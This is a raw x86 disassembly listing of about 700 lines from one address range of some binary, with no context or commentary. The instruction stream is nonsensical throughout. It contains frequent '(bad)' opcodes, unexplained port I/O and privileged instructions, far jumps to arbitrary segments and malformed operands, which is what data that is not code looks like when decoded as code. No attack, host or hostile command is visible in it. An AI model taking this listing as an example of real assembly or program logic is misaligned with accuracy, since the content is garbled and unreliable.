  41d7e0:	(bad)  
  41d7e1:	adc    al,0x31
  41d7e3:	jo     0x41d77a
  41d7e5:	jecxz  0x41d83c
  41d7e7:	ret    0x91f3
  41d7ea:	or     DWORD PTR [ecx+edx*4+0x7afd5322],0xc592e397
  41d7f5:	cmp    esp,DWORD PTR [esi-0x11]
  41d7f8:	xor    cl,ch
  41d7fa:	fistp  WORD PTR [edx-0x23b1c3ad]
  41d800:	mov    bh,0x2c
  41d802:	call   0xdc16:0x63ef38d8
  41d809:	push   es
  41d80a:	jge    0x41d819
  41d80c:	ficom  DWORD PTR [edi+ebp*2-0x6138cf7c]
  41d813:	in     eax,0x54
  41d815:	pop    edx
  41d816:	pop    ss
  41d817:	popf   
  41d818:	xchg   edx,eax
  41d819:	mov    ebx,0x8b6940cc
  41d81e:	or     BYTE PTR [esi+0x75],bl
  41d821:	cmp    BYTE PTR [edi],0xb7
  41d824:	inc    esi
  41d825:	sti    
  41d826:	jp     0x41d899
  41d828:	pop    ecx
  41d829:	lods   al,BYTE PTR ds:[esi]
  41d82a:	xchg   ebx,eax
  41d82b:	data16 and BYTE PTR [eax+0x34721761],cl
  41d832:	lea    esi,[ebp+0x9]
  41d835:	xor    ebp,esp
  41d837:	scas   eax,DWORD PTR es:[edi]
  41d838:	xchg   cl,cl
  41d83a:	push   esp
  41d83b:	xor    al,0x1c
  41d83d:	and    al,dh
  41d83f:	addr16 in al,0x50
  41d842:	frstor [edx]
  41d844:	cwde   
  41d845:	ficomp WORD PTR [ebp+0xd4823e2]
  41d84b:	mov    cl,0x93
  41d84d:	lea    edi,[ebx+0x5]
  41d850:	cs into 
  41d852:	data16 jmp 0x41d85d
  41d855:	(bad)  
  41d856:	daa    
  41d857:	aam    0x94
  41d859:	call   0x2ae42cb1
  41d85e:	push   ecx
  41d85f:	lds    ebp,FWORD PTR [ecx]
  41d861:	inc    edx
  41d862:	retf   0x84a6
  41d865:	(bad)  
  41d866:	mov    eax,0x6602e2cc
  41d86b:	xor    eax,0xcdedf294
  41d870:	loop   0x41d8a5
  41d872:	nop
  41d873:	out    0x84,al
  41d875:	xchg   esp,eax
  41d876:	(bad)  
  41d877:	mov    edi,0x7ec249bc
  41d87c:	cmp    BYTE PTR fs:[edx],ah
  41d87f:	test   edx,esp
  41d881:	mov    dh,0xfe
  41d883:	jbe    0x41d8b8
  41d885:	in     eax,0x91
  41d887:	push   esp
  41d888:	push   cs
  41d889:	mov    es,WORD PTR [ebx-0x8]
  41d88c:	mov    esi,0x3b1d8fc4
  41d891:	lds    esi,FWORD PTR [eax-0x791b934d]
  41d897:	jecxz  0x41d87e
  41d899:	data16 jo 0x41d88d
  41d89c:	xor    BYTE PTR [eax+eax*4+0x32],bl
  41d8a0:	sub    ecx,DWORD PTR [edi]
  41d8a2:	inc    esp
  41d8a3:	dec    esp
  41d8a4:	dec    ebp
  41d8a5:	jle    0x41d828
  41d8a7:	inc    edi
  41d8a8:	and    DWORD PTR [edx+ebx*8],esi
  41d8ab:	xchg   edx,eax
  41d8ac:	sbb    al,0x9b
  41d8ae:	adc    eax,0xba3aea20
  41d8b3:	ret    0xd642
  41d8b6:	xchg   ecx,eax
  41d8b7:	popf   
  41d8b8:	or     eax,0x8c759c6d
  41d8bd:	mov    DWORD PTR [esi],esi
  41d8bf:	(bad)  
  41d8c0:	addr16 in eax,0x46
  41d8c3:	or     DWORD PTR [edi+0x32],0x1ad83269
  41d8ca:	ret    
  41d8cb:	cmp    ecx,eax
  41d8cd:	or     DWORD PTR [esi+0x78c1ccc3],edx
  41d8d3:	out    0x2e,al
  41d8d5:	std    
  41d8d6:	jns    0x41d8d3
  41d8d8:	es scas eax,DWORD PTR es:[edi]
  41d8da:	sbb    eax,0x6bb7cff4
  41d8df:	test   BYTE PTR [edi-0xa5609b4],dh
  41d8e5:	fisubr DWORD PTR [esi+0x3c]
  41d8e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8e9:	xor    eax,0x86ec7f9d
  41d8ee:	xor    DWORD PTR [edi+eax*4-0x46b4f758],0xb74c51a5
  41d8f9:	loop   0x41d90a
  41d8fb:	iret   
  41d8fc:	outs   dx,DWORD PTR ds:[esi]
  41d8fd:	imul   eax,edx,0xd6cbdd14
  41d903:	xor    bl,BYTE PTR [edi-0xf]
  41d906:	sahf   
  41d907:	add    DWORD PTR [edx+0x74],esi
  41d90a:	test   DWORD PTR [edx+ebp*1+0x7e2070e],ebx
  41d911:	xchg   ebp,eax
  41d912:	dec    dl
  41d914:	sbb    al,0x99
  41d916:	call   0xd2297d6c
  41d91b:	in     al,dx
  41d91c:	pusha  
  41d91d:	lods   al,BYTE PTR ds:[esi]
  41d91e:	das    
  41d91f:	in     eax,dx
  41d920:	dec    edi
  41d921:	pop    ds
  41d922:	pop    eax
  41d923:	ds call 0xf229:0x5d8cdab4
  41d92b:	lahf   
  41d92c:	sbb    DWORD PTR [ecx-0x58],edi
  41d92f:	not    cl
  41d931:	adc    eax,ecx
  41d933:	shl    ah,0x5
  41d936:	sub    ebx,DWORD PTR ds:0xc33ec167
  41d93c:	call   0xe2641a96
  41d941:	or     ch,BYTE PTR [esi]
  41d943:	pop    edx
  41d944:	fild   QWORD PTR [esi]
  41d946:	popa   
  41d947:	and    al,0x7e
  41d949:	sub    esi,DWORD PTR [ebp+0x2b0be4a1]
  41d94f:	retf   0xa55a
  41d952:	(bad)  
  41d953:	dec    edx
  41d954:	sbb    ch,al
  41d956:	mov    ch,0x39
  41d958:	cwde   
  41d959:	add    bl,dl
  41d95b:	(bad)  
  41d95c:	cmp    BYTE PTR [ebx],dl
  41d95e:	add    ah,BYTE PTR [esi+0x7fbd5115]
  41d964:	test   al,0x48
  41d966:	daa    
  41d967:	jnp    0x41d986
  41d969:	xchg   BYTE PTR [ebx],ah
  41d96b:	cmp    al,0x46
  41d96d:	fadd   st,st(6)
  41d96f:	dec    esi
  41d970:	push   cs
  41d971:	das    
  41d972:	adc    al,0x9b
  41d974:	cmc    
  41d975:	mov    bh,0x34
  41d977:	add    al,0xea
  41d979:	push   edi
  41d97a:	pop    ds
  41d97b:	gs cld 
  41d97d:	cs xor al,0xb2
  41d980:	adc    edx,DWORD PTR [edx-0x61aaa82c]
  41d986:	out    dx,al
  41d987:	gs into 
  41d989:	push   0xa4e9eee7
  41d98e:	arpl   WORD PTR [eax],dx
  41d990:	fldcw  WORD PTR [esi-0x4eb8a52f]
  41d996:	push   edx
  41d997:	and    edx,DWORD PTR [edi-0x3040bd36]
  41d99d:	adc    eax,0x7c967dcf
  41d9a2:	xchg   dh,bh
  41d9a4:	out    dx,al
  41d9a5:	or     al,0x45
  41d9a7:	imul   eax,DWORD PTR [esi],0x1f0ed92a
  41d9ad:	jae    0x41d997
  41d9af:	mov    al,0x8a
  41d9b1:	inc    esp
  41d9b2:	adc    eax,0x25d36ad0
  41d9b7:	or     DWORD PTR [esi+ebp*4-0x7e],0x930df85f
  41d9bf:	pop    ecx
  41d9c0:	and    eax,0xc430dbf9
  41d9c5:	pop    eax
  41d9c6:	jge    0x41d96c
  41d9c8:	sub    eax,0x2347b888
  41d9cd:	mov    edi,0xf0961414
  41d9d2:	sbb    dh,BYTE PTR [eax-0x2e]
  41d9d5:	or     al,0xfb
  41d9d7:	loope  0x41d9e9
  41d9d9:	mov    bl,0xa5
  41d9db:	les    edx,FWORD PTR [ecx]
  41d9dd:	push   ds
  41d9de:	mov    al,0xef
  41d9e0:	aam    0xe7
  41d9e2:	loopne 0x41da0c
  41d9e4:	xchg   esi,eax
  41d9e5:	int3   
  41d9e6:	out    dx,eax
  41d9e7:	in     al,dx
  41d9e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d9e9:	mov    dh,0xbd
  41d9eb:	jge    0x41d9b8
  41d9ed:	mov    dh,0x8a
  41d9ef:	pop    ss
  41d9f0:	fsubp  st(2),st
  41d9f2:	(bad)  
  41d9f3:	sbb    eax,0xc87d5661
  41d9f8:	or     BYTE PTR [edi-0x6b3fc0be],ch
  41d9fe:	sbb    WORD PTR [edx-0x2ed48f9a],dx
  41da05:	inc    ecx
  41da06:	or     al,0xef
  41da08:	ss aaa 
  41da0a:	repz xor ebp,ebx
  41da0d:	xchg   BYTE PTR [eax-0x36beea57],bl
  41da13:	mov    edi,0x19790fcc
  41da18:	enter  0x1096,0x19
  41da1c:	dec    ebp
  41da1d:	ins    BYTE PTR es:[di],dx
  41da1f:	xchg   ebp,eax
  41da20:	push   ds
  41da21:	xor    al,0x69
  41da23:	loope  0x41d9a8
  41da25:	mov    esi,0xf41a8a07
  41da2a:	das    
  41da2b:	jl     0x41d9c6
  41da2d:	or     DWORD PTR [ebx],esi
  41da2f:	dec    edx
  41da30:	fsub   QWORD PTR [ecx+0x1ef5f00b]
  41da36:	jle    0x41da4a
  41da38:	jb     0x41d9fd
  41da3a:	icebp  
  41da3b:	shr    DWORD PTR [edx-0x39f3add3],cl
  41da41:	fs ds mov ebx,0xa39b0b5c
  41da48:	pop    esp
  41da49:	ins    BYTE PTR es:[edi],dx
  41da4a:	inc    ebp
  41da4b:	push   esp
  41da4c:	mov    bl,0x50
  41da4e:	dec    edx
  41da4f:	xor    dl,BYTE PTR [eax-0x55]
  41da52:	cs loop 0x41d9e2
  41da55:	loopne 0x41da81
  41da57:	or     BYTE PTR [edx-0x54],bh
  41da5a:	retf   0xdb9c
  41da5d:	shl    DWORD PTR es:[eax+0x459fee3e],1
  41da64:	lock fcomip st,st(7)
  41da67:	sub    ebx,DWORD PTR [edx-0x77f0d3f6]
  41da6d:	xor    esp,0x298b57b
  41da73:	daa    
  41da74:	scas   eax,DWORD PTR es:[edi]
  41da75:	fistp  WORD PTR [edx+esi*4]
  41da78:	imul   ebp,esi,0x5526630d
  41da7e:	mov    WORD PTR [ecx],?
  41da80:	test   eax,0x915fa7d7
  41da85:	ficom  DWORD PTR [ebp+ebp*2+0x1ad871b6]
  41da8c:	clc    
  41da8d:	es inc edx
  41da8f:	sub    al,dh
  41da91:	add    al,BYTE PTR [ecx]
  41da93:	ss js  0x41dad8
  41da96:	jmp    0x1b72:0xc2a677e5
  41da9d:	in     eax,0x3d
  41da9f:	daa    
  41daa0:	push   ss
  41daa1:	cli    
  41daa2:	rcr    BYTE PTR [ecx+0x4],cl
  41daa5:	adc    DWORD PTR [esi-0x79],esi
  41daa8:	or     bl,ah
  41daaa:	mov    al,ds:0x9831e017
  41daaf:	bound  ecx,QWORD PTR [esi]
  41dab1:	es in  al,0x9
  41dab4:	sbb    esi,esi
  41dab6:	or     al,0xde
  41dab8:	sbb    cl,BYTE PTR [edx-0x24881259]
  41dabe:	and    ecx,ebp
  41dac0:	and    edx,DWORD PTR [ecx]
  41dac2:	shr    BYTE PTR ds:0x35bf6337,1
  41dac8:	cmp    al,0x69
  41daca:	inc    ebx
  41dacb:	ins    BYTE PTR es:[edi],dx
  41dacc:	dec    edi
  41dacd:	nop    DWORD PTR [ecx+0x3a2c5b6a]
  41dad4:	fadd   QWORD PTR [ecx]
  41dad6:	fxch   st(0)
  41dad8:	stos   DWORD PTR es:[edi],eax
  41dad9:	shr    DWORD PTR [edx-0x737106cd],1
  41dadf:	add    DWORD PTR [ecx+0x5a1ac192],ebp
  41dae5:	push   ecx
  41dae6:	jp     0x41db0c
  41dae8:	or     esi,ebx
  41daea:	cmp    bl,ah
  41daec:	scas   al,BYTE PTR es:[edi]
  41daed:	je     0x41dae6
  41daef:	pop    edx
  41daf0:	js     0x41db07
  41daf2:	mov    ds:0x7f39c82,al
  41daf7:	adc    cl,BYTE PTR [edi-0x565a2742]
  41dafd:	test   al,0x60
  41daff:	add    eax,0xae4c14a0
  41db04:	fdivrp st(4),st
  41db06:	mov    edi,0xf19b2a4
  41db0b:	push   cs
  41db0c:	fnsave [eax]
  41db0e:	adc    dl,BYTE PTR [edx-0x5ac4bc7f]
  41db14:	mov    dh,0xc9
  41db16:	and    edi,DWORD PTR [si-0x1339]
  41db1b:	ja     0x41dade
  41db1d:	inc    esi
  41db1e:	push   ecx
  41db1f:	ret    
  41db20:	and    ah,ch
  41db22:	imul   edx,edx,0x8898b89a
  41db28:	mov    ds:0xd9515330,al
  41db2d:	ret    
  41db2e:	dec    BYTE PTR [ebx+esi*1-0x4d]
  41db32:	je     0x41db08
  41db34:	pushf  
  41db35:	fisubr WORD PTR [esi]
  41db37:	sub    ebx,DWORD PTR [edi]
  41db39:	mov    eax,ds:0x761d187b
  41db3e:	repnz inc esi
  41db40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db41:	dec    ebx
  41db42:	dec    edx
  41db43:	push   ebp
  41db44:	mov    ss,WORD PTR [edi+0x24]
  41db47:	lds    esi,FWORD PTR [edx+0x31]
  41db4a:	push   edx
  41db4b:	xor    bl,BYTE PTR [esi-0x3884dd88]
  41db51:	mov    ecx,DWORD PTR [esi-0x43]
  41db54:	out    dx,al
  41db55:	mov    dh,0xc7
  41db57:	mov    cl,0x48
  41db59:	fsubr  DWORD PTR [ecx-0x6c45f2c9]
  41db5f:	sub    bl,bl
  41db61:	add    al,0x99
  41db63:	jle    0x41db1f
  41db65:	lahf   
  41db66:	xchg   edx,eax
  41db67:	ins    BYTE PTR es:[edi],dx
  41db68:	pushf  
  41db69:	outs   dx,DWORD PTR ds:[esi]
  41db6a:	(bad)  
  41db6b:	(bad)  
  41db6c:	mov    ecx,0x88d31a0
  41db71:	cli    
  41db72:	icebp  
  41db73:	pop    ss
  41db74:	loopne 0x41dbeb
  41db76:	inc    edi
  41db77:	loopne 0x41db2d
  41db79:	repnz mov bl,0x15
  41db7c:	ss jle 0x41db65
  41db7f:	sti    
  41db80:	cmp    cl,BYTE PTR [edx-0x57a46ca0]
  41db86:	push   ds
  41db87:	loope  0x41dbc9
  41db89:	dec    edx
  41db8a:	rcl    BYTE PTR [esi+0x1],cl
  41db8d:	push   edx
  41db8e:	fcomp  QWORD PTR [eax+0x469ddb1f]
  41db94:	(bad)  
  41db96:	or     al,0x15
  41db98:	addr16 cwde 
  41db9a:	es add eax,0x96691094
  41dba0:	std    
  41dba1:	push   ebp
  41dba2:	lods   eax,DWORD PTR ds:[esi]
  41dba3:	and    cl,dh
  41dba5:	lds    ecx,FWORD PTR [esi+eiz*4-0x6c]
  41dba9:	loopne 0x41db65
  41dbab:	int3   
  41dbac:	rcr    DWORD PTR [edi],0x56
  41dbaf:	inc    eax
  41dbb0:	(bad)  
  41dbb1:	call   0xa770c437
  41dbb6:	mov    esp,0x21d1c9ca
  41dbbb:	cs in  al,dx
  41dbbd:	(bad)
  41dbc1:	(bad)  
  41dbc2:	enter  0x318,0xe
  41dbc6:	fmul   st(2),st
  41dbc8:	lea    esi,[edi]
  41dbca:	ja     0x41db89
  41dbcc:	scas   al,BYTE PTR es:[edi]
  41dbcd:	dec    edx
  41dbce:	fs pop eax
  41dbd0:	pusha  
  41dbd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dbd2:	adc    bl,bl
  41dbd4:	out    dx,eax
  41dbd5:	xchg   ecx,eax
  41dbd6:	add    DWORD PTR [ebx+edx*1],ecx
  41dbd9:	scas   al,BYTE PTR es:[edi]
  41dbda:	gs sahf 
  41dbdc:	jg     0x41db6e
  41dbde:	mov    edi,0x5c0c3e20
  41dbe3:	ds dec ecx
  41dbe5:	rol    dh,0x61
  41dbe8:	sub    ebp,DWORD PTR [edi-0x4bc7850b]
  41dbee:	js     0x41dbcb
  41dbf0:	in     eax,0xd4
  41dbf2:	hlt    
  41dbf3:	ror    BYTE PTR [eax],1
  41dbf5:	retf   
  41dbf6:	repz mov edi,0x964f8c8b
  41dbfc:	rcr    DWORD PTR [esi],0x58
  41dbff:	into   
  41dc00:	aas    
  41dc01:	xchg   esp,eax
  41dc02:	cwde   
  41dc03:	aas    
  41dc04:	js     0x41dc58
  41dc06:	hlt    
  41dc07:	je     0x41dbd8
  41dc09:	and    al,0x63
  41dc0b:	stos   BYTE PTR es:[edi],al
  41dc0c:	and    BYTE PTR [ecx],bh
  41dc0e:	cdq    
  41dc0f:	mov    bl,BYTE PTR [eax-0x3a373b06]
  41dc15:	push   ss
  41dc16:	pusha  
  41dc17:	inc    edx
  41dc18:	inc    ecx
  41dc19:	or     bl,ch
  41dc1b:	and    DWORD PTR [ebx+0x10],ebx
  41dc1e:	pop    edi
  41dc1f:	push   edx
  41dc20:	pop    es
  41dc21:	adc    DWORD PTR [edx+eax*2+0x4b],esi
  41dc25:	sub    ebp,DWORD PTR [edi]
  41dc27:	icebp  
  41dc28:	maskmovq mm0,(bad)
  41dc29:	test   DWORD PTR ds:0x4448ac49,0xa2221d7e
  41dc33:	addr16 daa 
  41dc35:	mov    ds:0xcfdaf7f5,al
  41dc3a:	fisubr WORD PTR [ebp+0x41]
  41dc3d:	mov    bl,0x1e
  41dc3f:	sahf   
  41dc40:	push   0xffffff84
  41dc42:	mov    cl,0x2a
  41dc44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc45:	arpl   WORD PTR cs:[edi+eax*1-0x74],di
  41dc4a:	adc    ebp,ecx
  41dc4c:	fistp  QWORD PTR [esi]
  41dc4e:	xchg   ebp,eax
  41dc4f:	and    esp,DWORD PTR [ebp+0x3d]
  41dc52:	mov    BYTE PTR [ecx+0x14],0x5a
  41dc56:	enter  0xe95a,0xe9
  41dc5a:	pusha  
  41dc5b:	sub    DWORD PTR [ecx-0x5a0839b4],0x631c1bf6
  41dc65:	adc    al,0xcd
  41dc67:	sub    bh,BYTE PTR [ebx-0x7c9a0dd2]
  41dc6d:	xchg   ecx,eax
  41dc6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc6f:	sahf   
  41dc70:	xchg   esp,eax
  41dc71:	scas   al,BYTE PTR es:[edi]
  41dc72:	adc    ah,BYTE PTR [edx+0x16e784a]
  41dc78:	addr16 xchg ebp,eax
  41dc7a:	mov    bh,0xee
  41dc7c:	daa    
  41dc7d:	aas    
  41dc7e:	mov    bh,0x39
  41dc80:	inc    ecx
  41dc81:	int    0x68
  41dc83:	dec    esi
  41dc84:	cmp    DWORD PTR [ebx-0x3de4f7b3],edx
  41dc8a:	jg     0x41dcd4
  41dc8c:	and    DWORD PTR [eax-0x2f13e41],esi
  41dc92:	xor    BYTE PTR [edx+0x319d342c],bh
  41dc98:	jns    0x41dc97
  41dc9a:	sar    ch,0xc
  41dc9d:	push   0x2
  41dc9f:	sub    esp,DWORD PTR [edx-0x2179365b]
  41dca5:	repnz mov edx,0xcd45daf1
  41dcab:	mov    ecx,0x2019dbf7
  41dcb0:	sub    eax,0xc83d89f9
  41dcb5:	iret   
  41dcb6:	cmc    
  41dcb7:	jno    0x41dcf4
  41dcb9:	inc    eax
  41dcba:	imul   ebp,eax,0xd0017b43
  41dcc0:	sbb    dl,dh
  41dcc2:	mov    al,ds:0xa845c6d7
  41dcc7:	clc    
  41dcc8:	fist   WORD PTR [ebp-0x4a2689]
  41dcce:	sbb    eax,DWORD PTR [ebp-0x42262763]
  41dcd4:	ins    BYTE PTR es:[edi],dx
  41dcd5:	inc    eax
  41dcd6:	and    eax,0xa56e1b55
  41dcdb:	add    bh,BYTE PTR [esi]
  41dcdd:	scas   eax,DWORD PTR es:[edi]
  41dcde:	adc    BYTE PTR [esi*4-0x543fca14],0xc3
  41dce6:	adc    BYTE PTR [ebp-0x7e06e02a],al
  41dcec:	inc    ecx
  41dced:	xchg   ecx,eax
  41dcee:	inc    ebx
  41dcef:	inc    esp
  41dcf0:	xchg   ebx,eax
  41dcf1:	lods   al,BYTE PTR ds:[esi]
  41dcf2:	je     0x41dca4
  41dcf4:	jle    0x41dd6b
  41dcf6:	loopne 0x41dcb3
  41dcf8:	xlat   BYTE PTR ds:[ebx]
  41dcf9:	sti    
  41dcfa:	test   edi,0xe85b1545
  41dd00:	arpl   WORD PTR [esp+ecx*1],ax
  41dd03:	in     eax,dx
  41dd04:	add    ah,ah
  41dd06:	dec    edx
  41dd07:	jp     0x41dd86
  41dd09:	adc    eax,0x706c6771
  41dd0e:	pop    esi
  41dd0f:	mov    ds:0xd02f3acf,al
  41dd14:	sub    eax,0xc62d2be9
  41dd19:	(bad)  
  41dd1a:	lods   eax,DWORD PTR ds:[esi]
  41dd1b:	push   0xffffffa7
  41dd1d:	sbb    ebx,esp
  41dd1f:	xchg   DWORD PTR [ecx],ebp
  41dd21:	in     al,dx
  41dd22:	dec    eax
  41dd23:	or     dl,BYTE PTR [ebx]
  41dd25:	cld    
  41dd26:	shr    ah,1
  41dd28:	xor    ebx,edi
  41dd2a:	add    eax,0x1c31bb28
  41dd2f:	test   esp,edx
  41dd31:	mov    bl,0xf8
  41dd33:	xor    ecx,esi
  41dd35:	or     al,0x13
  41dd37:	jne    0x41dcff
  41dd39:	jno    0x41dd25
  41dd3b:	xor    al,0x9e
  41dd3d:	inc    ebx
  41dd3e:	xor    DWORD PTR [ecx+0x5785c4c3],edx
  41dd44:	pop    edi
  41dd45:	xchg   DWORD PTR [edx],ebp
  41dd47:	push   ebp
  41dd48:	fadd   QWORD PTR [edx]
  41dd4a:	loopne 0x41ddc1
  41dd4c:	ins    DWORD PTR es:[edi],dx
  41dd4d:	ret    0xe380
  41dd50:	addr16 sbb eax,0x8899c6dd
  41dd56:	cmc    
  41dd57:	jmp    0x41dd43
  41dd59:	xlat   BYTE PTR ds:[ebx]
  41dd5a:	fisttp DWORD PTR [ebx+0x6756d044]
  41dd60:	pusha  
  41dd61:	adc    eax,0x1f53ac04
  41dd66:	jmp    0x3dfd:0x44039bf1
  41dd6d:	js     0x41dd74
  41dd6f:	dec    esi
  41dd70:	(bad)  
  41dd71:	aam    0x1b
  41dd73:	inc    ebx
  41dd74:	push   ecx
  41dd75:	cwde   
  41dd76:	jl     0x41dda2
  41dd78:	jne    0x41dd65
  41dd7a:	inc    ebx
  41dd7b:	mov    WORD PTR [ecx+0x50],?
  41dd7e:	and    eax,0x888deaab
  41dd83:	js     0x41dd20
  41dd85:	push   ecx
  41dd86:	sbb    al,0x15
  41dd88:	adc    dl,BYTE PTR [edx+0x5ad17f90]
  41dd8e:	pushf  
  41dd8f:	jae    0x41dd36
  41dd91:	mov    ebp,0xa31a0ad1
  41dd96:	out    dx,al
  41dd97:	sbb    DWORD PTR [edx+0x1c],0xba9f3b51
  41dd9e:	sub    BYTE PTR [eax+0x61],bh
  41dda1:	xlat   BYTE PTR ds:[ebx]
  41dda2:	adc    BYTE PTR [ebp-0x78],cl
  41dda5:	loopne 0x41dd9c
  41dda7:	call   0xa801:0x138af764
  41ddae:	pusha  
  41ddaf:	in     al,0xdb
  41ddb1:	adc    ch,BYTE PTR [eax+0x4006c32f]
  41ddb7:	not    edi
  41ddb9:	ret    0xc88b
  41ddbc:	add    ah,cl
  41ddbe:	xchg   esi,eax
  41ddbf:	stc    
  41ddc0:	pop    ds
  41ddc1:	pop    esi
  41ddc2:	jl     0x41de1f
  41ddc4:	out    dx,al
  41ddc5:	mov    DWORD PTR [edi+0x5d6df31b],ebx
  41ddcb:	(bad)  
  41ddcc:	sbb    bl,ch
  41ddce:	dec    esp
  41ddcf:	jae    0x41dd89
  41ddd1:	dec    esp
  41ddd2:	cmp    DWORD PTR [esi-0x7fdae25e],esp
  41ddd8:	inc    eax
  41ddd9:	imul   ebx,DWORD PTR [ebp+eax*1+0x7b],0x99248b6e
  41dde1:	fidiv  DWORD PTR [esi+0x76]
  41dde4:	(bad)  
  41dde5:	scas   al,BYTE PTR es:[edi]
  41dde6:	dec    ebx
  41dde7:	pop    ebx
  41dde8:	and    eax,0x4ee07b6a
  41dded:	leave  
  41ddee:	and    edi,edi
  41ddf0:	int    0xf3
  41ddf2:	pop    ds
  41ddf3:	rcr    DWORD PTR [ecx],0xbd
  41ddf6:	ins    BYTE PTR es:[edi],dx
  41ddf7:	shl    DWORD PTR [edx+0x57],0x76
  41ddfb:	fnstcw WORD PTR [edi+0x1f]
  41ddfe:	iret   
  41ddff:	pop    ecx
  41de00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de01:	test   eax,0x8f8f577d
  41de06:	test   DWORD PTR [edi-0x54],ebx
  41de09:	outs   dx,BYTE PTR ds:[esi]
  41de0a:	xor    al,dl
  41de0c:	push   es
  41de0d:	(bad)  
  41de0e:	cld    
  41de0f:	and    esp,DWORD PTR [edx+0x3eb5207e]
  41de15:	pop    edx
  41de16:	mov    edi,0x8206ec98
  41de1b:	jecxz  0x41de51
  41de1d:	jmp    0xbdc2ff24
  41de22:	sbb    DWORD PTR [edi-0x70],esi
  41de25:	cmp    eax,0x2bd782
  41de2a:	and    ebx,DWORD PTR [ebp+0x5b17db00]
  41de30:	iret   
  41de31:	adc    dl,al
  41de33:	fcomip st,st(5)
  41de35:	fmul   QWORD PTR [edx-0x75]
  41de38:	mov    eax,ds:0x54d82b68
  41de3d:	inc    edx
  41de3e:	mov    eax,ds:0xe3eee925
  41de43:	cli    
  41de44:	in     al,dx
  41de45:	xchg   esp,eax
  41de46:	dec    eax
  41de47:	cli    
  41de48:	jmp    0x4eee:0x3fa2ee2
  41de4f:	fidiv  WORD PTR [esi-0x486c8e81]
  41de55:	pop    edx
  41de56:	fwait
  41de57:	mov    ds:0x1f419fdd,al
  41de5c:	mov    cl,0x86
  41de5e:	and    eax,0x37783503
  41de63:	pushf  
  41de64:	aaa    
  41de65:	or     bl,BYTE PTR [ebx+0x25b89e9a]
  41de6b:	outs   dx,BYTE PTR ds:[esi]
  41de6c:	sub    ebp,DWORD PTR [esi+eiz*8]
  41de6f:	mov    bh,0xc8
  41de71:	inc    eax
  41de72:	adc    ebx,DWORD PTR [ebp-0xc5e902d]
  41de78:	inc    esp
  41de79:	push   esp
  41de7a:	jp     0x41de76
  41de7c:	mov    fs,WORD PTR [edi]
  41de7e:	xchg   ebp,eax
  41de7f:	jge    0x41de27
  41de81:	scas   al,BYTE PTR es:[edi]
  41de82:	jmp    0x41debf
  41de84:	stos   BYTE PTR es:[edi],al
  41de85:	dec    esi
  41de86:	dec    ebx
  41de87:	jl     0x41de81
  41de89:	scas   al,BYTE PTR es:[edi]
  41de8a:	scas   eax,DWORD PTR es:[edi]
  41de8b:	bound  esp,QWORD PTR [ebx]
  41de8d:	(bad)  [edx-0x63]
  41de90:	(bad)
  41de93:	je     0x41dea4
  41de95:	cs ins DWORD PTR es:[edi],dx
  41de97:	in     al,0xaa
  41de99:	enter  0xb28b,0x48
  41de9d:	and    dl,bh
  41de9f:	bound  ebx,QWORD PTR [edi-0x73]
  41dea2:	push   ss
  41dea3:	or     DWORD PTR [ebp+0x11596f74],ebp
  41dea9:	pop    edx
  41deaa:	dec    esi
  41deab:	mov    edx,0x33aed7ae
  41deb0:	dec    ebp
  41deb1:	cmp    eax,0xb8add120
  41deb6:	pop    es
  41deb7:	fstp   DWORD PTR [esp+esi*2]
  41deba:	fisttp DWORD PTR [eax+0x3e]
  41debd:	jecxz  0x41de3f
  41debf:	repz dec ebx
  41dec1:	add    ebx,eax
  41dec3:	jae    0x41de94
  41dec5:	addr16 sub bh,dh
  41dec8:	jge    0x41df09
  41deca:	mov    eax,ds:0x17457325
  41decf:	cmp    eax,0x2f807f5c
  41ded4:	rep ins DWORD PTR es:[edi],dx
  41ded6:	dec    ebp
  41ded7:	mov    DWORD PTR [eax-0x316a0723],esp
  41dedd:	add    ah,BYTE PTR [edx]
  41dedf:	push   ecx
  41dee0:	imul   edi,DWORD PTR [ebx+0x51cda13b],0xdadb13be
  41deea:	popf   
  41deeb:	cmp    DWORD PTR [ebx-0x60],ecx
  41deee:	inc    edx
  41deef:	fdiv   QWORD PTR [eax-0x2d]
  41def2:	scas   eax,DWORD PTR es:[edi]
  41def3:	fwait
  41def4:	jo     0x41df3c
  41def6:	or     dl,BYTE PTR [ebx]
  41def8:	pop    edx
  41def9:	add    BYTE PTR [esi],dh
  41defb:	jp     0x41df13
  41defd:	mov    ah,0x37
  41deff:	test   ah,bl
  41df01:	adc    eax,0x9df982c5
  41df06:	ja     0x41df1b
  41df08:	stc    
  41df09:	xor    BYTE PTR [eax-0x5b],al
  41df0c:	shl    BYTE PTR [esi+0x64cf8ba5],1
  41df12:	loop   0x41de98
  41df14:	cli    
  41df15:	clc    
  41df16:	jl     0x41df09
  41df18:	jnp    0x41df45
  41df1a:	dec    edi
  41df1b:	lea    esi,[ebp+0x42]
  41df1e:	(bad)  
  41df1f:	mov    ebx,0xe5815042
  41df24:	aaa    
  41df25:	inc    edx
  41df26:	retf   
  41df27:	xor    al,0x64
  41df29:	inc    ebx
  41df2a:	cmp    eax,0x323599b9
  41df2f:	sbb    DWORD PTR [esi+0x5f],esp
  41df32:	mov    dl,0xea
  41df34:	mov    eax,0x1e348fd3
  41df39:	xchg   DWORD PTR [eax],ebx
  41df3b:	call   0xe660:0xfb7ad0ac
  41df42:	pop    ss
  41df43:	out    dx,al
  41df44:	not    DWORD PTR [esi+0x3860f28]
  41df4a:	outs   dx,BYTE PTR ds:[esi]
  41df4b:	xor    ecx,DWORD PTR [ebx-0x5e22152e]
  41df51:	and    esi,DWORD PTR [ecx-0x25]
  41df54:	jmp    0x22589b24
  41df59:	jecxz  0x41df37
  41df5b:	cmc    
  41df5c:	xor    BYTE PTR [ebx],ah
  41df5e:	push   eax
  41df5f:	das    
  41df60:	jns    0x41dfd6
  41df62:	pusha  
  41df63:	xchg   ebx,eax
  41df64:	(bad)  
  41df65:	cmc    
  41df66:	fadd   QWORD PTR [ebp-0x5835f8df]
  41df6c:	inc    esp
  41df6d:	leave  
  41df6e:	mov    bl,0x52
  41df70:	cld    
  41df71:	jp     0x41df18
  41df73:	dec    ecx
  41df74:	fsubr  QWORD PTR [edi+0x12]
